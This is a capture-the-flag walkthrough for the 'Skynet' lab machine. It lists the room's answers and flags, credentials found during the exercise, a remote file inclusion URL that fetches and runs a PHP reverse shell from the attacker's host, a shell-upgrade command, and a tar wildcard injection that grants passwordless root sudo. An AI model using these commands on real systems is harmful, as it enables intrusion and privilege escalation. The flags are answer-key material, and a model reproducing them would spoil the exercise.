# SKYNET

## BASIC INFO
```
export IP=10.10.126.157
```

## DEPLOY AND COMPROMISE THE VULNERABLE MACHINE
> - **What is Miles password for his emails?**
>> cyborg007haloterminator

With nmap we saw that smb port is open.\
Using enum4linux we know that there's a *anonymous* user on it.\
Log in with anonymous and blank password, then download log1.txt.\
Inside is a list of possible password for Miles.

> - **What is the hidden directory?**
>> /45kra24zxs28v3yd

When logged in to Miles email we saw there's a password reset email that is sent to him.\
Inside contains his new password.\
Log in to his account now
```
miledyson:)s{A&2Z=F^n_E.B`
```

> - **What is the vulnerability called when you can include a remote file for malicious purposes?**
>> Remote file inclusion

> - **What is the user flag?**
>> 7ce5c2109a40f958099283600a9ae807

EXploit the machine with RFI.\
Using the following link we can upload [rev_shell.php](rev_shell.php) to the machine and run it. Remember to set up a listener.
```
http://10.10.126.157/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.8.8.177:8000/rev_shell.php
```

Once we got a shell, we can spawn a stable shell with the following command.
```
python -c "import pty; pty.spawn('/bin/bash')"
```
Then we can just `cat /home/milesdyson/user.txt`

> - **What is the root flag?**
>> 3f0372db24753accc7179a282cd6a949

With linpeas and some manual enumeration reveals a backup jobs running as root and using tar. Some google on tar wildcard injection later and we come out with an exploit.
First we move to /var/www/html where the file is backup from.
Then running the following command.
```
echo 'echo "www-data ALL=(root) NOPASSWD: ALL"> /etc/sudoers' > privesc.sh
echo "/var/www/html" > "--checkpoint-action=exec=sh privesc.sh"
echo "/var/www/html" > "--checkpoint=1"

```

This exploit abuse the wildcatd in "tar * " into using file names as command arguments.\
Wait for a moment then we run `sudo -l` to confirm that our exploit has been success.\
```
User www-data may run the following commands on skynet:
	(root) NOPASSWD: ALL
```

![badges](../../../badges/dianchia.png)